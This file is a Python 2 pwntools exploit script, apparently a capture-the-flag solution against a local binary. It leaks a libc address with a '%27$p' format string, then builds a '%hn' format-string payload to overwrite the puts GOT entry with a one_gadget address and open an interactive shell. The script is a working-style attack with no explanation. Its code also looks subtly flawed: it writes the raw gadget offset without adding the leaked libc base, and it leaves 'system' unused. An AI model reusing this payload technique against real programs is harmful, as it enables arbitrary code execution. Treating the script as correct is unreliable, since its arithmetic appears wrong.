#!/usr/bin/env python2
from pwn import *

exe = ELF("./lib")
libc = ELF("/usr/lib/libc-2.33.so")
context.binary = exe
context.terminal = "kitty sh -c".split()
#context.log_level = "debug"

global io
breakpoints = '''
break main
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

system = libc.symbols['system']
got = exe.got['puts']
one_gadget = 0xccc1d

def s1(x):
    reu("name?\n")
    sl(x)

def s2(x):
    reu("out?")
    sl(x)

def get_length(a,b):
    while hex(a)[-4:] != b:
        a = a + 1
    return a

def fstring_payload_64(addr, offset, waddr):
    addr = hex(addr).replace("0x","")
    if len(addr) < 16:
        addr = addr.rjust(16,"0")
    var1 = int(addr[-4:],16)
    s2 = addr[-8:-4]
    s3 = addr[-12:-8]
    var2 = get_length(var1,s2) - var1
    var3 = get_length(var1 + var2, s3) - var2 - var1
    payload = "%{}c%{}$hn%{}c%{}$hn%{}c%{}$hn".format(var1,offset+5,var2,offset+6,var3,offset+7).ljust(40,"a")
    payload += (p64(waddr) + p64(waddr+2) + p64(waddr+4))
    return payload

s1("%27$p")
reu("re ")
libc_leak = int(rl(),16)-0x27b25
log.info("Libc Leak -> "+hex(libc_leak))

s2(fstring_payload_64(one_gadget,16,got))

io.interactive()